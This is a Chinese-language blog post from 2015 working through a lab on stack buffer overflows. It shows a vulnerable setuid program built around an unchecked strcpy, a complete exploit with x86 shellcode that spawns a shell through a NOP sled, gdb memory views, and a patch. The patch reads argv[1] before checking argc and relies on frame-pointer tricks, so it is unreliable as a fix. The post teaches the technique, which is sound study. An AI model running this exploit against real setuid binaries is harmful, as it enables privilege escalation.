title: Stackoverflow
date: 2015-03-05 19:28:28
tags: IS
categories: IS
---
说一下很久以前就做过最近有遇到了的缓冲区溢出问题吧。
<!--more-->
当然最开始要放上来的还是有漏洞的程序。为了节省篇幅，仅仅把主函数粘上来，也就是我们有漏洞的地方。程序如下：

```
#include <stdio.h>
#include <string.h>
#include <fcntl.h>
#include <sys/stat.h>
#include "common.h"

int main(int argc, char *argv[]) {
  uid_t userid = getuid();
  int printing = 1;
  int fd;
  char search_buffer[100];

  if (argc > 1) {
    strcpy(search_buffer, argv[1]);
  } else {
    search_buffer[0] = '\0'; // Null byte - empty string
  }

  fd = open(NOTE_FILE, O_RDONLY);
  if (fd == -1) {
    fatal("Problem opening file in main()");
  }
  while(printing) {
    printing = print_notes(fd, userid, search_buffer);
  }
  printf("--------[ END OF DATA ]--------\n");
  close(fd);

  return 0;
}
```
##程序攻击##

学过信息安全的大约都能看出来，中间strcpy函数复制的时候没有检查输入参数的边界。因此只要输入的稍微长点的参数，就会产生溢出。接下来我们就在ubuntu 下做一下这个实验吧。
先说一下基本原理吧。在每个函数的特定位置，存放着该函数的返回地址。这个返回地址可能会被有溢出漏洞的数组，函数覆盖。如果这个返回地址被用新的地址覆盖了，而且新的地址指向我们另外一段程序，那样的话我们就可以通过这个程序获得更高的权限了。
第一步，编译程序。截图如下：
![com.png](/image/Stackoverflow/2.png)
编译这一步必须做对了。不然就不能继续下去。下面我解释一下这几个有关参数：
```
gcc -o searchnote -z execstack -fno-stack-protector -g searchnote.c
```
这句代码是这样的。在现代编译器中，gcc会对很多安全问题进行处理。比方说禁止数据堆栈区的程序运行，缓冲区溢出处理等等。一旦gcc处理了这些问题，我们的缓冲区溢出攻击也就没办法继续下去了。
这里 -z execstack 就是用来告诉编译器栈上的程序是可以运行的。 -fno-stack-protector 是用来禁用堆栈溢出保护的。这样下去之后，就可以运行下一步了。
**PS:gcc4.6以上好像这两句代码不好使了，堆栈保护一直关不掉。最后我只好使用gdb继续进行试验了**
第二步，设计我们的攻击程序。程序代码如下：

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
char shellcode[]=
"\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x6a\x0b\x58\x51\x68"
"\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89"
"\xe1\xcd\x80"
;
#define OFFSET 500

unsigned long getESP(){
    __asm__("movl %ESP,%EAX");
}
// This code builds the malicious input required to trigger our buffer overflow,and then
// invokes the searchnote binary with it. Once finished, this code should yield a root shell.
int main(int argc, char *argv[]) {
char *command, *buffer;
unsigned long addr;
addr = getESP() + OFFSET;
command = calloc(2000, sizeof(char));
fprintf(stderr, "Using Offset: 0x%x\nShellcode Size:%d\n",addr,sizeof(shellcode));
strcpy(command, "./searchnote \'"); // start command buffer
buffer = command + strlen(command); // set buffer at the end
// fill buffer with enough copies of an address within the NOP sled to overwrite the return address
memset(buffer,0x90,1024);
// append suitably long NOP sled to give a large enough target for the previous part to work reliably

int i;
for(i = 0;i < 200;i += 4){
buffer[i] = addr & 0x000000ff;
buffer[i + 1] = (addr & 0x0000ff00) >> 8; 
buffer[i + 2] = (addr & 0x00ff0000) >> 16;
buffer[i + 3] = (addr & 0xff000000) >> 24;
}

memcpy(buffer + 900,shellcode,sizeof(shellcode));

// append our shellcode to buffer
strcat(command, "\'");
system(command); // run exploit
free(command);
}

```
关键部分在这里
![code1.png](/image/Stackoverflow/5.png)
下面我解释一下这个代码。
```
#define OFFSET 500

unsigned long getESP(){
    __asm__("movl %ESP,%EAX");
}
unsigned long addr;
addr = getESP() + OFFSET;
```
这部分代码，我们用来得到当前堆栈的起始位置。OFFSET是我们猜测的偏移量。addr就是我们的shellcode的大概位置了。我们只要把shellcode附着在buffer的后边，然后让这个addr指向shellcode大概的前边就可以。这里我们用到一个东西叫做NOP sled。
NOP sled就是当程序指针指导NOP的时候，它会继续往下寻找可执行程序。一直“滑”到可执行的程序位置。这样的话我们把shellcode的前边用0x90填充，在一大堆0x90(NOP)的包围下，addr只要指向shellcode前边的某个NOP即可，程序指针就会滑下去，滑到我们的shellcode然后执行。

```
// fill buffer with enough copies of an address within the NOP sled to overwrite the return address
memset(buffer,0x90,1024);
```
这一段代码就是用0x90来填充buffer，长度为1024.

```
int i;
for(i = 0;i < 200;i += 4){
buffer[i] = addr & 0x000000ff;
buffer[i + 1] = (addr & 0x0000ff00) >> 8; 
buffer[i + 2] = (addr & 0x00ff0000) >> 16;
buffer[i + 3] = (addr & 0xff000000) >> 24;
}

memcpy(buffer + 900,shellcode,sizeof(shellcode));

```
这一部分是这样，因为我们不确定存着函数返回地址的地址，我们就暴力的从buffer的开始，不断的用addr来填充所有的部分。一直填充到200个为止。由于返回地址的对齐，所以中间一定能覆盖到返回地址，指向addr。然后返回到这个addr之后一直沿着0x90滑下去。滑到shellcode就成功了。

下边我们看一下具体攻击的情况。首先如下图：


![setuid.png](/image/Stackoverflow/8.png)
chmod就是另外一个技术，所谓setuid，也就是让别的用户运行这个程序享有某些权限。这里我们这么写之后，用另外一个新建用户"eve"执行程序，也就有了和程序创建用户一样的效果。
我们用gdb对searchnote进行一下调试，观察一下内存的变化过程。


![stack1.png](/image/Stackoverflow/3.png)
这里我们看到，在运行strcpy之前，我们的内存数据是正常的。这个时候main的返回地址应该是在0xbffff250左右。具体哪个已经不重要了。因为在缓冲区覆盖完成之后，可能的位置已经全变成指向shellcode的位置了。在上图的下方，大片的地址已经被我们得到的addr地址，也就是指向我们shellcode的地址覆盖。这个地址是0xbffff45c。其实可以看出来我们猜测的偏移量的大了。大约在0xbffff2f0就可以写入了。但是由于我们中间全用0x90填充，返回指针一直会滑到我们的shellcode的位置。


![stack2.png](/image/Stackoverflow/4.png)
这张图片揭示了我们shellcode附近的情况。0xbffff45c也就是程序返回执行的位置，在前边隐去了。程序指针会顺着NOP sled 一直滑到shellcode复婚，也就是0xbffff5a0的位置。开始执行shellcode。


![result.png](/image/Stackoverflow/1.png)
运行完shellcode就是上边这个结果了。
**PS:预期结果应该是获取root权限。但是由于程序创建者没有这个权限，同时ubuntu系统有bash的保护机制，导致没能获取root权限。这里我们仅仅获取了程序创建者的权限，但是这已经证明了我们成功的进行了缓冲区溢出攻击**

##程序漏洞修补##
程序修补比较简单，只要检查输入长度然后加以判断就好。关键代码如下：
```
struct stack_frame {
  struct stack_frame* next;
  void* ret;
};

void ** get_addr_of_ret_addr() {
  /* x86/gcc-specific: this tells gcc that the fp
     variable should be set to the %ebp register
     which keeps the frame pointer */
  register struct stack_frame* fp asm("ebp");
  // the rest just walks through the linked list
  struct stack_frame* frame = fp; // This is the stack frame of get_ebp
  // Move down the stack to the stack frame which called get_ebp
  frame = frame->next;
  // We want to return the *address* of the retur address 
  return &frame->ret;
}
```
上边这些代码的作用是获得当前函数的返回地址的存储地址。

![code_fix.png](/image/Stackoverflow/6.png)

```
  char search_buffer[100];
  void ** addr;
  addr = get_addr_of_ret_addr();
  int gap = (char *)addr - search_buffer;
  printf("%d\n",strlen(argv[1])); 
  if(gap <= strlen(argv[1])){
      printf("The args is too long\n");
      return 0;
  }	
  if (argc > 1) {
    strcpy(search_buffer, argv[1]);
  } else {
    search_buffer[0] = '\0'; // Null byte - empty string
  }
```
上边这些代码首先使用get_addr_of_ret_addr()获取当前程序返回地址的存放地址，然后用gap来存放返回地址和search_buffer的空间大小。如果输入的长度大于该长度，就输出提示，同时程序停止。

修补后的实验结果如下：
![result.png](/image/Stackoverflow/9.png)
修补程序成功。